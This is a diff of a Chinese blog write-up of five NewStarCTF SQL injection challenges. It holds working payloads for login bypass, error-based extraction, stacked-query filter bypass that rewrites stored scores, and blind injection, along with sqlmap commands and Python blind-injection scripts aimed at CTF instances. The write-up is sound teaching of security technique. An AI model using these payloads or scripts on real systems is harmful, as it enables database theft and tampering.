@@ -79,7 +79,8 @@
     
   </style>
   
-<meta name="generator" content="Hexo 6.3.0"></head>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
+</head>
 
 
 
@@ -178,7 +179,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~9.86K
+                        ~9.54K
                     
                     字
                 </li>
@@ -204,67 +205,56 @@
             <div itemprop="articleBody"><p>摆烂大师的第一篇Web文章，qwq。检验我摆烂的水平的时间到了</p>
 <p>写写NewStarCTF的SQL注入题吧… 五周考了五个注入，考的点都不一样</p>
 <span id="more"></span>
-
-<h1><span id="newstarctf-week-1-word-for-you">NewStarCTF Week 1： Word - For - You</span></h1><p>嗯… 这个题其实并不算sql注入，只是让你熟悉SQL的语句罢了</p>
-<h2><span id="打开靶机">打开靶机</span></h2><p>查询语句发现，输入1和输入1’的回显是一致的，根据这个信息能够初步得出考的应该不是SQL注入</p>
+<h1><span id="newstarctf-week-1-word-for-you"> NewStarCTF Week 1： Word - For - You</span></h1>
+<p>嗯… 这个题其实并不算sql注入，只是让你熟悉SQL的语句罢了</p>
+<h2><span id="打开靶机"> 打开靶机</span></h2>
+<p>查询语句发现，输入1和输入1’的回显是一致的，根据这个信息能够初步得出考的应该不是SQL注入</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/1.png" class title="输入1时的回显">
-
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/2.png" class title="输入1" alt="时的回显">
-
-
-
-<h2><span id="sql万能密码">SQL万能密码</span></h2><p>一般查询数据库执行的语句时 <code>select user_id,user_type,email from users where user_id=&#39;用户名&#39; and password=&#39;密码&#39;</code></p>
-<p>由于后台进行数据库查询时没有滤过单引号，当输入admin 和 1’ or’1’&#x3D;’1时，执行的语句为：</p>
-<p><code>select user_id,user_type,email from users where user_id=&#39;admin&#39; and password=&#39;1&#39; or&#39;1&#39;=&#39;1&#39;</code></p>
+<h2><span id="sql万能密码"> SQL万能密码</span></h2>
+<p>一般查询数据库执行的语句时 <code>select user_id,user_type,email from users where user_id='用户名' and password='密码'</code></p>
+<p>由于后台进行数据库查询时没有滤过单引号，当输入admin 和 1’ or’1’='1时，执行的语句为：</p>
+<p><code>select user_id,user_type,email from users where user_id='admin' and password='1' or'1'='1'</code></p>
 <p>这样子看的话，SQL查询语句被分成了两段：</p>
-<p>第一段：<code>select user_id,user_type,email from users where user_id=&#39;admin&#39; and password=&#39;1&#39;</code>   （由于sql语句中逻辑优先度 【&#x3D;】&gt;【and】&gt;【or】）</p>
-<p>第二段：<code>&#39;1&#39;=&#39;1&#39;</code></p>
+<p>第一段：<code>select user_id,user_type,email from users where user_id='admin' and password='1'</code>   （由于sql语句中逻辑优先度 【=】&gt;【and】&gt;【or】）</p>
+<p>第二段：<code>'1'='1'</code></p>
 <p>这两段语句之间的逻辑运算符是or</p>
-<p>由于1&#x3D;1恒为真，所以这段SQL语句恒为真，认证成功</p>
-<h2><span id="payload">payload</span></h2><p>使用SQL注入万能密码查询</p>
-<p><code>1&#39; or&#39;1&#39;=&#39;1</code></p>
+<p>由于1=1恒为真，所以这段SQL语句恒为真，认证成功</p>
+<h2><span id="payload"> payload</span></h2>
+<p>使用SQL注入万能密码查询</p>
+<p><code>1' or'1'='1</code></p>
 <p>拿到flag</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/3.png" class title="拿到flag">
-
-
-
-<h1><span id="newstarctf-week-2-word-for-you-2-gen">NewStarCTF Week 2： Word - For - You (2 Gen)</span></h1><p>报错注入 &#x2F; sqlmap一把梭</p>
-<h2><span id="打开靶机">打开靶机</span></h2><p>输入1’ 发现报错，存在SQL注入</p>
-<h2><span id="测试联合注入">测试联合注入</span></h2><h3><span id="测试字段">测试字段</span></h3><p>输入<code>1&#39; order by 3#</code> 报错</p>
-<p>而输入<code>1&#39; order by 2#</code> 回显正常，说明字段数为2</p>
+<h1><span id="newstarctf-week-2-word-for-you-2-gen"> NewStarCTF Week 2： Word - For - You (2 Gen)</span></h1>
+<p>报错注入 / sqlmap一把梭</p>
+<h2><span id="打开靶机"> 打开靶机</span></h2>
+<p>输入1’ 发现报错，存在SQL注入</p>
+<h2><span id="测试联合注入"> 测试联合注入</span></h2>
+<h3><span id="测试字段"> 测试字段</span></h3>
+<p>输入<code>1' order by 3#</code> 报错</p>
+<p>而输入<code>1' order by 2#</code> 回显正常，说明字段数为2</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/4.png" class title="测试字段3，报错">
-
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/5.png" class title="测试字段2，正常">
-
-<h3><span id="测试回显位">测试回显位</span></h3><p>输入<code>1&#39; union select 1,2#</code> 只显示查询成功，说明没有回显位</p>
+<h3><span id="测试回显位"> 测试回显位</span></h3>
+<p>输入<code>1' union select 1,2#</code> 只显示查询成功，说明没有回显位</p>
 <p>无法使用联合注入查询</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/6.png" class title="无回显位">
-
-
-
-<h2><span id="使用报错注入">使用报错注入</span></h2><p>报错注入适用条件：页面没有回显位，但是页面会有报错信息，例如输入 <code>1&#39; order by 3#</code>的时候</p>
-<p>注入语句：<code>updatexml(1,&#39;~&#39;,3)</code>，当第二个语句包含特殊字符时，数据库会报错，并且会把参数的内容显示在报错中</p>
+<h2><span id="使用报错注入"> 使用报错注入</span></h2>
+<p>报错注入适用条件：页面没有回显位，但是页面会有报错信息，例如输入 <code>1' order by 3#</code>的时候</p>
+<p>注入语句：<code>updatexml(1,'~',3)</code>，当第二个语句包含特殊字符时，数据库会报错，并且会把参数的内容显示在报错中</p>
 <p>需要使用concat语句拼接字符串，长串的语句使用group_concat</p>
 <p>查询命令：</p>
-<p><code>1&#39; and updatexml(1,concat(&#39;~&#39;,database()),3)#</code>  		–爆库</p>
+<p><code>1' and updatexml(1,concat('~',database()),3)#</code>  		--爆库</p>
 <p>爆出库名wfy</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/7.png" class title="报错注入爆库">
-
-
-
-<p><code>1&#39; and updatexml(1,concat(&#39;~&#39;,(select group_concat(table_name) from inforamtion_schema.tables where table_schema=database())),3)#</code>			–爆表</p>
+<p><code>1' and updatexml(1,concat('~',(select group_concat(table_name) from inforamtion_schema.tables where table_schema=database())),3)#</code>			--爆表</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/8.png" class title="报错注入爆表">
-
-
-
-<p><code>1&#39; and updatexml(1,concat(&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;wfy_comments&#39;)),3)#</code>		–爆列名</p>
+<p><code>1' and updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name='wfy_comments')),3)#</code>		--爆列名</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/9.png" class title="报错注入爆列名">
-
-
-
 <p>爆出的列名为id,text,user,name,display</p>
 <p>我们只需要查询text的内容即可</p>
-<h2><span id="payload">payload</span></h2><p><code>1&#39; and updatexml(1,concat(&#39;~&#39;,(select(reverse(group_concat(text))) from wfy_comments)),3)#</code></p>
+<h2><span id="payload"> payload</span></h2>
+<p><code>1' and updatexml(1,concat('~',(select(reverse(group_concat(text))) from wfy_comments)),3)#</code></p>
 <p>要点：</p>
 <ul>
 <li>报错注入的查询内容的字符是有限制的，如果内容过多，则无法回显。所以我们这里使用reverse()将flag倒着输出</li>
@@ -272,161 +262,137 @@
 </ul>
 <p>拿到倒置的flag</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/10.png" class title="获取flag">
-
-<h2><span id="sqlmap一把梭">sqlmap一把梭</span></h2><p>sqlmap的使用教程可以查看这篇博客文章</p>
-<p>&lt;[(9条消息) <a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46363249/article/details/119975790?ops_request_misc=%7B%22request_id%22:%22166438065816782412550364%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=166438065816782412550364&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-119975790-null-null.142%5Ev50%5Epc_rank_34_1,201%5Ev3%5Econtrol_2&utm_term=sqlmap&spm=1018.2226.3001.4187">工具使用]SqlMap_拈花倾城的博客-CSDN博客_sqlmap联动msf</a>&#x2F;&gt;</p>
+<h2><span id="sqlmap一把梭"> sqlmap一把梭</span></h2>
+<p>sqlmap的使用教程可以查看这篇博客文章</p>
+<p>&lt;[(9条消息) <a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46363249/article/details/119975790?ops_request_misc=%7B%22request_id%22%3A%22166438065816782412550364%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=166438065816782412550364&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-119975790-null-null.142%5Ev50%5Epc_rank_34_1,201%5Ev3%5Econtrol_2&amp;utm_term=sqlmap&amp;spm=1018.2226.3001.4187">工具使用]SqlMap_拈花倾城的博客-CSDN博客_sqlmap联动msf</a>/&gt;</p>
 <p>我们可以使用burp抓包的方式，抓到包的数据存入txt文本内，并使用sqlmap梭哈</p>
 <p>将抓包的数据保存至txt文本内</p>
 <p><code>sqlmap -r 1.txt --dbs</code></p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/11.png" class title="sqlmap:爆库">
-
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/12.png" class title="sqlmap:爆库成功">
-
 <p><code>sqlmap -r 1.txt -D wfy --dump</code></p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/13.png" class title="sqlmap:拿到flag">
-
 <p>爆库内容</p>
-<h1><span id="newstarctf-week-3-multisql">NewStarCTF Week 3： multiSQL</span></h1><p>堆叠注入，sql预处理语句</p>
+<h1><span id="newstarctf-week-3-multisql"> NewStarCTF Week 3： multiSQL</span></h1>
+<p>堆叠注入，sql预处理语句</p>
 <p>题目描述：需要我们修改火华老师的成绩，让他通过四级考试</p>
-<h3><span id="测试联合注入-x2f-报错注入">测试联合注入 &#x2F; 报错注入</span></h3><p>输入<code>1&#39; 1</code>均无回显</p>
-<p>输入<code>1&#39; union select 1,2,3,4</code># 发现被过滤</p>
+<h3><span id="测试联合注入-报错注入"> 测试联合注入 / 报错注入</span></h3>
+<p>输入<code>1' 1</code>均无回显</p>
+<p>输入<code>1' union select 1,2,3,4</code># 发现被过滤</p>
 <p>联合注入失败</p>
 <p>由于无报错信息，无法使用报错注入</p>
-<h3><span id="堆叠注入">堆叠注入</span></h3><p>堆叠注入是将多个sql语句一起执行，使用;间隔的注入方式</p>
-<p>输入<code>1&#39;;show databases;#</code> 爆库</p>
+<h3><span id="堆叠注入"> 堆叠注入</span></h3>
+<p>堆叠注入是将多个sql语句一起执行，使用;间隔的注入方式</p>
+<p>输入<code>1';show databases;#</code> 爆库</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/14.png" class title="堆叠注入，爆库">
-
-
-
-<p>输入<code>1&#39;;show tables;#</code>  爆表</p>
+<p>输入<code>1';show tables;#</code>  爆表</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/15.png" class title="堆叠注入，爆表">
-
-
-
-<p>输入<code>1&#39;;show columns from score;#</code> 爆列名</p>
+<p>输入<code>1';show columns from score;#</code> 爆列名</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/16.png" class title="堆叠注入，爆列名">
-
-
-
-<h3><span id="修改数据">修改数据</span></h3><p>使用update语句修改分数即可</p>
+<h3><span id="修改数据"> 修改数据</span></h3>
+<p>使用update语句修改分数即可</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update`score` set listen=9999 where username=&quot;火华&quot;</span><br></pre></td></tr></table></figure>
-
-
-
 <p>发现被过滤，怀疑过滤update</p>
 <p>所以这里需要我们使用sql预处理语句进行拼接，绕过update的过滤</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;set @sql=concat(&#x27;u&#x27;,&#x27;pdate `score` set listen=99999 where username=&quot;火华&quot;&#x27;);prepare sql_exe from @sql;execute sql_exe;#</span><br></pre></td></tr></table></figure>
-
 <ul>
-<li>设置sql语句&#x3D;拼接u 和后面的语句</li>
+<li>设置sql语句=拼接u 和后面的语句</li>
 <li>预处理sql_exe</li>
 <li>执行sql_exe</li>
 </ul>
 <p>点击验证成绩即可，然后就能拿到flag</p>
 <p>或者</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; handler `score` open as `a`; handler `a` read next;#</span><br></pre></td></tr></table></figure>
-
-
-
 <p>查看分数</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/17.png" class title="堆叠注入，查看分数">
-
 <p>点击验证成绩就能获得flag</p>
-<h3><span id="彩蛋">彩蛋</span></h3><p>这里如果修改的分数不一样的话，拿到flag的对话也是不一样的</p>
+<h3><span id="彩蛋"> 彩蛋</span></h3>
+<p>这里如果修改的分数不一样的话，拿到flag的对话也是不一样的</p>
 <p>修改成100分的结果如下</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/18.png" class title="获取flag">
-
 <p>修改成99999分的结果如下</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/19.png" class title="获取flag">
-
-<p><del>所以这个故事告诉我们不要把分数改的太大（雾）</del></p>
-<h1><span id="newstarctf-week-4-又一个sql">NewStarCTF Week 4： 又一个SQL</span></h1><p>异或&#x2F;布尔盲注</p>
-<h2><span id="打开靶机">打开靶机</span></h2><p>尝试性输入1 和 1’</p>
+<p><s>所以这个故事告诉我们不要把分数改的太大（雾）</s></p>
+<h1><span id="newstarctf-week-4-又一个sql"> NewStarCTF Week 4： 又一个SQL</span></h1>
+<p>异或/布尔盲注</p>
+<h2><span id="打开靶机"> 打开靶机</span></h2>
+<p>尝试性输入1 和 1’</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/20.png" class title="尝试联合注入">
-
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/21.png" class title="尝试联合注入">
-
-
-
 <p>果然，寄。没有回显位，没有报错信息。</p>
 <p>我们常用的三种注入方式已经无效了，所以我们接下来要考虑盲注</p>
 <p>由于输入1 和 1’的回显信息是好耶和啊哦（刚好是两种不同的信息）</p>
 <p>我们这里输入0试试</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/22.png" class title="盲注测试">
-
 <p>发现输入0和输入1是两种不同的回显，这样我们就可以使用盲注了</p>
-<h2><span id="异或运算">异或运算</span></h2><p>异或的运算有：</p>
+<h2><span id="异或运算"> 异或运算</span></h2>
+<p>异或的运算有：</p>
 <ul>
-<li>1 ^ 1 &#x3D; 0</li>
-<li>1 ^ 0 &#x3D; 1</li>
-<li>0 ^ 0 &#x3D; 0</li>
-<li>0 ^ 1 &#x3D; 1</li>
+<li>1 ^ 1 = 0</li>
+<li>1 ^ 0 = 1</li>
+<li>0 ^ 0 = 0</li>
+<li>0 ^ 1 = 1</li>
 </ul>
 <p>也就是说，两件事的异或运算中，如果有一真一假，就会输出1</p>
 <p>如果两件都是真，则输出0</p>
 <p>那么我们就可以通过异或运算构造sql语句查询</p>
-<p><code>1^(length(database())=3)</code>  </p>
+<p><code>1^(length(database())=3)</code></p>
 <p>注：如果过滤空格，则需要通过加括号的方式进行绕过，此题过滤了空格，所以要在length前加括号</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/24.png" class title="空格过滤">
-
-<p>如果数据库的名称长度为3，则为真 1^1 &#x3D; 0，传的数据为0，回显为啊哦</p>
+<p>如果数据库的名称长度为3，则为真 1^1 = 0，传的数据为0，回显为啊哦</p>
 <p>如果数据库的名称长度不为3，则传的数据为1，回显为好耶</p>
-<p>通过不断更改&#x3D;后面的数字，可以得出数据库的长度</p>
+<p>通过不断更改=后面的数字，可以得出数据库的长度</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/23.png" class title="盲注测试">
-
-<p>发现&#x3D;3时，返回啊哦，则说明数据库长度为3，并且布尔&#x2F;异或盲注可用~</p>
+<p>发现=3时，返回啊哦，则说明数据库长度为3，并且布尔/异或盲注可用~</p>
 <p>接下来就是编写脚本的事情了</p>
-<h2><span id="编写盲注脚本">编写盲注脚本</span></h2><p>采用二分法方式编写盲注脚本</p>
-<h3><span id="啥是二分法方式">啥是二分法方式？</span></h3><p>emmm，盲注的原理是一个字符的ascii码数值与你的数值作比较，需要一个个进行比较输出</p>
-<p>比如爆库的一个查询语句是1^(ascii(substr(database(),1,1))&#x3D;100)</p>
+<h2><span id="编写盲注脚本"> 编写盲注脚本</span></h2>
+<p>采用二分法方式编写盲注脚本</p>
+<h3><span id="啥是二分法方式"> 啥是二分法方式？</span></h3>
+<p>emmm，盲注的原理是一个字符的ascii码数值与你的数值作比较，需要一个个进行比较输出</p>
+<p>比如爆库的一个查询语句是1^(ascii(substr(database(),1,1))=100)</p>
 <p>即数据库名称的第一个字符的ascii 与 100 比较，如果是100 即提交0，返回的值是啊哦</p>
 <p>而二分法能够缩短这个过程（</p>
 <p>首先，从数组的中间元素开始搜索，如果该元素正好是目标元素，则搜索过程结束，否则执行下一步。</p>
-<p>如果目标元素大于&#x2F;小于中间元素，则在数组大于&#x2F;小于中间元素的那一半区域查找，然后重复步骤（1）的操作。</p>
+<p>如果目标元素大于/小于中间元素，则在数组大于/小于中间元素的那一半区域查找，然后重复步骤（1）的操作。</p>
 <p>如果某一步数组为空，则表示找不到目标元素。</p>
 <p>大致意思是取第一个字符的ascii值和ascii（32，128）中间值，也就是80（刚好是常用的字段）作比较，如果ascii值大于中间值，从（80,132）的中间值比较,重复比较 直至ascii值相等。</p>
-<h3><span id="结束一个判断的依据">结束一个判断的依据</span></h3><p>根据页面返回的信息不同，在我的情况中，如果返回的是啊哦，说明是1^1型，那么，啊哦就是正确的依据</p>
-<h3><span id="python编写">Python编写</span></h3><p>这里给出post &#x2F; get请求的两种盲注的脚本（</p>
+<h3><span id="结束一个判断的依据"> 结束一个判断的依据</span></h3>
+<p>根据页面返回的信息不同，在我的情况中，如果返回的是啊哦，说明是1^1型，那么，啊哦就是正确的依据</p>
+<h3><span id="python编写"> Python编写</span></h3>
+<p>这里给出post / get请求的两种盲注的脚本（</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = <span class="string">&#x27;http://b4281729-cf5b-4705-81b6-74971a11b390.node4.buuoj.cn:81/comments.php&#x27;</span>  <span class="comment">#目标url</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span> <span class="comment">#输出的结果</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span>    <span class="comment">#二分法固定的格式（  定好ascii的左右两端</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right):    <span class="comment">#post请求，前面的name可以改为其他post传参的变量名</span></span><br><span class="line">        payload = &#123;</span><br><span class="line">                <span class="string">&quot;name&quot;</span>:<span class="string">&quot;1^(ascii(substr(database(),%d,1))&lt;%d)&quot;</span>%(i,mid)  <span class="comment">#循环传入i,mid  爆库</span></span><br><span class="line">                <span class="comment">#&quot;name&quot;:&quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d)&quot;%(i,mid) #爆表</span></span><br><span class="line">                <span class="comment">#&quot;name&quot;:&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&quot;wfy_comments&quot;)),%d,1))&lt;%d)&quot;%(i,mid) #爆列</span></span><br><span class="line">                <span class="comment">#&quot;name&quot;:&quot;1^(ascii(substr((select(group_concat(text))from(wfy_comments)),%d,1))&lt;%d)&quot;%(i,mid) #读取内容</span></span><br><span class="line">                <span class="comment">#&quot;name&quot;:&quot;1^(ascii(substr((select(reverse(group_concat(text)))from(wfy_comments)),%d,1))&lt;%d)&quot;%(i,mid) #读取内容，倒序输出</span></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        html=requests.post(url,data=payload) <span class="comment">#post传参，传入数据=payload内容</span></span><br><span class="line">        <span class="built_in">print</span>(payload) <span class="comment">#方便检测有没有问题</span></span><br><span class="line">        time.sleep(<span class="number">0.04</span>) <span class="comment">#防止buuoj.cn的429</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;啊哦&quot;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">                right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                left = mid + <span class="number">1</span>  <span class="comment">#如果返回的不是啊哦，说明为假，例如&lt;80时为假,则需要+1</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span> <span class="comment">#重复上述过程</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;=<span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span> <span class="comment">#找到的值不存在时，退出</span></span><br><span class="line">    res+=<span class="built_in">chr</span>(mid-<span class="number">1</span>)  <span class="comment">#小于号，需要-1</span></span><br><span class="line">    <span class="built_in">print</span>(res) <span class="comment">#输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Result:&quot;</span>,res) <span class="comment">#输出结果</span></span><br><span class="line"><span class="comment">#print(&quot;Final Result&quot;,res[::-1]) #采用倒序输出时，将结果正向输出</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>其实你只要跑一次就知道为什么要-1了</p>
 <p>最后一次输出的值是&lt;120，返回为真，但是我们此时的mid是120，真正的值是&lt;120</p>
 <p>get传参也是如此</p>
-<p>这里给出buuoj.cn FinalSQL的盲注脚本</p>
+<p><a target="_blank" rel="noopener" href="http://xn--buuoj-xf6hi49xzo2alxd.cn">这里给出buuoj.cn</a> FinalSQL的盲注脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys<span class="comment">#头文件</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://1189e07b-be07-49cc-9b96-af07b0b4f9b0.node4.buuoj.cn:81/search.php?id=&quot;</span></span><br><span class="line"></span><br><span class="line">res=<span class="string">&quot;&quot;</span> <span class="comment">#结果</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>): <span class="comment">#循环</span></span><br><span class="line">        left=<span class="number">32</span></span><br><span class="line">        right=<span class="number">128</span></span><br><span class="line">        mid=(left + right) //<span class="number">2</span>  <span class="comment">#二分中值</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr(database(),%d,1))&lt;%d)#&quot;%(i,mid)#爆库</span></span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d)#&quot;%(i,mid)#爆表</span></span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&lt;%d)#&quot;%(i,mid)#爆列</span></span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr((select(group_concat(id,username,password))from(F1naI1y)),%d,1))&lt;%d)#&quot;%(i,mid) #爆字段，第一个%d传入i 第二个%d传入mid值，数据库的ascii与mid两个作比较，如果一直&lt; 一直循环</span></span><br><span class="line">                payload = url+<span class="string">&quot;1^(ascii(substr((select(reverse(group_concat(id,username,password)))from(F1naI1y)),%d,1))&lt;%d)#&quot;</span>%(i,mid) <span class="comment">#爆字段，第一个%d传入i 第二个%d传入mid值，数据库的ascii与mid两个作比较，如果一直&lt; 一直循环，倒序输出</span></span><br><span class="line">                html = requests.get(payload)</span><br><span class="line">                <span class="built_in">print</span>(payload)</span><br><span class="line">                time.sleep(<span class="number">0.04</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">in</span> html.text: <span class="comment">#这里写入的传参值是&lt; 返回的是ERROR才是对的反应</span></span><br><span class="line">                        right = mid <span class="comment">#如果有延时，右值取中值，再用左+右/2的新区间值与ascii比较(例如，第一次是ascii与80,如果小于80 用ascii与32+80/2=56比较)</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        left = mid + <span class="number">1</span>  <span class="comment">#如果没有，左值取中值+1，取（81,132）中值比较，ascii值比mid值要大</span></span><br><span class="line">                mid = (left + right) // <span class="number">2</span> <span class="comment">#重复上述过程</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mid &lt;=<span class="number">32</span> <span class="keyword">or</span> mid &gt;=<span class="number">127</span>:</span><br><span class="line">                <span class="keyword">break</span> <span class="comment">#防止超出ascii码值</span></span><br><span class="line">        res += <span class="built_in">chr</span>(mid-<span class="number">1</span>) <span class="comment">#小于号，值要-1</span></span><br><span class="line">        <span class="built_in">print</span>(res) <span class="comment">#打印</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Result:&quot;</span>,res)</span><br><span class="line"><span class="comment">#print(&quot;Final Result:&quot;,res[::-1]) #采用倒序输出时，将结果正向输出</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>我们愉快的跑脚本就完事了</p>
 <img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/25.png" class title="爆破flag">
-
-
-
-<h1><span id="newstarctf-week-5-final-round">NewStarCTF Week 5： Final Round</span></h1><p>延时盲注</p>
+<h1><span id="newstarctf-week-5-final-round"> NewStarCTF Week 5： Final Round</span></h1>
+<p>延时盲注</p>
 <p>题面提示：啊呜，好困呜呜（sleep）</p>
-<h2><span id="进入靶机">进入靶机</span></h2><p>其实已经不用测什么方式注入了，sleep嘛，延时注入</p>
+<h2><span id="进入靶机"> 进入靶机</span></h2>
+<p>其实已经不用测什么方式注入了，sleep嘛，延时注入</p>
 <p>测试语句：</p>
 <p><code>114514||if(length(database())=3,sleep(0.2),1)</code></p>
 <p>如果数据库名长度为3，休眠两秒再访问（</p>
 <p>肉眼可见的延迟</p>
-<h2><span id="编写脚本">编写脚本</span></h2><p>同样使用python脚本，同样也是post请求，同样也是二分法</p>
+<h2><span id="编写脚本"> 编写脚本</span></h2>
+<p>同样使用python脚本，同样也是post请求，同样也是二分法</p>
 <p>套异或的就行了，只不过判断的方式有些不同</p>
-<p>bool&#x2F;异或 是根据1和0的两种回应来判断的，而time是根据访问的时间来进行访问的</p>
+<p>bool/异或 是根据1和0的两种回应来判断的，而time是根据访问的时间来进行访问的</p>
